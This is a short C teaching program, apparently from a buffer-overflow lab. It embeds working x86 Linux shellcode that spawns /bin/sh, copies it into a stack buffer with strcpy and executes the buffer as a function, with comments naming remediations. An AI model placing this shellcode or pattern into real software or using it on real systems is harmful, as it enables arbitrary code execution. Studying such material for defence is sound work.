// Copies a block of shellcode into a character buffer
// Executes block as a function, causing it to spawn a shell (/bin/sh) (by making a sys call using assembly instructions)

// Remediation 1) use strncpy (proper bounds checking), 2) Stack Canaries (detect stack buffer overflow before malicious code execution)

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// const char code[] array contains shellcode, designed to spawn a shell (/bin/sh) when executed
const char code[] = 
	"\x31\xc0"		/* xorl		%eax,%eax 	*/
	"\x50"			/* pushl	%eax 		*/
	"\x68""//sh"	/* pushl	$0x68732f2f */
	"\x68""/bin"	/* pushl	$0x6e69622f */
	"\x89\xe3"		/* movl		%esp,%ebx 	*/
	"\x50"			/* pushl	%eax		*/	
	"\x53"			/* pushl	%ebx		*/
	"\x89\xe1"		/* movl		%esp,%ecx	*/
	"\x99"			/* cdq					*/
	"\xb0\x0b"		/* movb		$0x0b,%al	*/
	"\xcd\x80"		/* int		$0x80		*/
;

int main(int argc, char **argv)
{
	// buf array declared with sizeof(code). Is it sufficient to hold the data being copied into it?
	char buf[sizeof(code)]; 
	// strcpy does not perform bounds checking (whether code array is larger than buf array)
	strcpy(buf,code); 		
	// treat buf as a function pointer and call it as a function (arbitrary code execution)
	((void(*)( ))buf)( );
}